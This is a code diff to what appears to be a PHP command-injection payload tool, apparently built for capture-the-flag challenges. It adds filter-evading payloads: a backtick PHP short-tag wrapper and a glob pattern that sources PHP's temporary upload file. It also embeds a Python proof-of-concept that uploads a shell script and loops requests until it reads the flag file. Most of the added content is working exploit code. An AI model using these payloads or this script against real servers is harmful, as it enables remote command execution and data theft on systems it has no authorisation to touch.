@@ -114,6 +114,38 @@ UPLOAD_EXEC_TEMPLATES = [
     ". /var/tmp/php??????",
 ]
 
+# Article final POC wrapper integration
+# Wrapper only, no behavior change to existing templates.
+UPLOAD_EXEC_WRAPPER_TEMPLATES = [
+    "?><?=`{cmd}`;?>",
+]
+
+# Special output trigger payloads:
+# show Egs hint when final payload matches bare or wrapped upload POC.
+SPECIAL_UPLOAD_POC_TRIGGER_PAYLOADS = [
+    ". /???/????????[@-[]",
+    "?><?=`. /???/????????[@-[]`;?>",
+]
+
+SPECIAL_UPLOAD_POC_EGS = """
+import requests
+
+url = ""
+
+params = {
+    "shell":"?><?=`. /???/????????[@-[]`;?>"
+}
+
+file = {
+    'file':("1.txt","#!/bin/sh\\n cat /flag","text/plain")
+}
+
+for i in range(1,20):
+    res = requests.post(url=url, params=params, files=file)
+    if "flag" in res.text:
+        print(res.text)
+        break"""
+
 # PHP Command Execution Functions
 PHP_EXEC_WRAPPERS = [
     "system",
